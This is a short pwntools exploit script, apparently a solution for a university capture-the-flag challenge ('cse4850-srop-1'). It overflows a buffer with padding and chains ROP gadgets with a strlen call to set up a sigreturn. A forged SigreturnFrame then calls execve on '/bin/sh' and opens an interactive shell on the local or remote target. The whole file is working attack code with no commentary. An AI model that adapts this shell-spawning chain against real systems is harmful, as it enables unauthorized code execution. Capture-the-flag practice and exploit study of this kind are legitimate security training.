from pwn import *

context.update(
    arch="amd64",
    endian="little",
    log_level="debug",
    os="linux",
    terminal=["st"]
)

def start(binary):
    gs = '''
        init-pwndbg
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        b *0x4012c7
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote("cse4850-srop-1.chals.io", 443, ssl=True, sni="cse4850-srop-1.chals.io")
    else:
        return process(binary)


def exploit(p, e, r):

    pad = b"A" * 16

    syscall = 0x4012e0
    strlen = p64(e.plt["strlen"])
    string = p64(0x4020cb)
    pop_rdi = p64(r.find_gadget(["pop rdi", "ret"])[0])
    ret = p64(r.find_gadget(["ret"])[0])
    binsh = next(e.search(b"/bin/sh\x00"))

    frame = SigreturnFrame()
    frame.rax = 59
    frame.rdi = binsh
    frame.rip = syscall

    chain = ret + pop_rdi + string
    chain += strlen
    chain += p64(syscall)
    chain += bytes(frame)


    p.sendline(pad + chain)
    p.interactive()


if __name__ == "__main__":
    file = "./chal.bin"
    p = start(file)
    e = context.binary = ELF(file)
    r = ROP(e)

    exploit(p, e, r)
